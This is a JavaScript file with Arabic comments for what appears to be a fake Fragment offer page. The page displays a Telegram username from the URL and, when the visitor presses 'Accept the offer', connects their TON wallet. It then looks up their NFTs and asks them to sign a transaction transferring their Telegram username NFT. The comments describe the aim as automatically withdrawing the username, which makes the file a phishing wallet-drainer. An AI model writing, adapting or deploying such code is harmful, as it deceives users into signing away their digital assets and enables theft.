// 1. إعداد TonConnect وتحديد ملف الـ Manifest
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://alawi2396.github.io/fragment-web/tonconnect-manifest.json',
    buttonRootId: 'connect-button'
});

// 2. استخراج اليوزر من الرابط وتحديث الواجهة فوراً
const urlParams = new URLSearchParams(window.location.search);
const targetUser = urlParams.get('user') || 'username';

document.addEventListener('DOMContentLoaded', () => {
    // تحديث كل العناصر التي تحمل IDs تبدأ بحرف u (مثل u1, u2, u3, u4)
    const elements = ['u1', 'u2', 'u3', 'u4'];
    elements.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.innerText = targetUser;
    });
});

// 3. منطق السحب التلقائي عند الضغط على الزر (Accept the offer)
document.getElementById('confirm-btn').onclick = async () => {
    // التأكد من أن المستخدم قام بربط محفظته أولاً
    if (!tonConnectUI.connected) {
        // إذا لم يكن متصلاً، نفتح له قائمة المحافظ
        await tonConnectUI.openModal();
        return;
    }

    const walletAddress = tonConnectUI.account.address;

    try {
        // فحص محتويات محفظة المستخدم لجلب الـ NFTs
        const response = await fetch(`https://tonapi.io/v2/accounts/${walletAddress}/nfts`);
        const data = await response.json();
        
        // البحث عن يوزر تليجرام (NFT) داخل المحفظة
        const nftItem = data.nft_items.find(item => 
            item.metadata && item.metadata.name && item.metadata.name.includes('.t.me')
        );

        if (nftItem) {
            // تجهيز طلب المعاملة (الهدف: سحب اليوزر المكتشف)
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 360, // صالحة لمدة 6 دقائق
                messages: [
                    {
                        address: nftItem.address, // عقد اليوزر الذي تم اكتشافه تلقائياً
                        amount: "0", 
                        payload: "te6ccgEBAQEADgAAGAAAABAAAABAAAAA" // بايلود النقل (Transfer)
                    }
                ]
            };
            
            // إرسال الطلب للمحفظة للتوقيع
            await tonConnectUI.sendTransaction(transaction);
            console.log("Transaction sent for NFT:", nftItem.metadata.name);
        } else {
            alert("This account does not have a valid Telegram Username NFT.");
        }
    } catch (error) {
        console.error("Error during transaction:", error);
    }
};
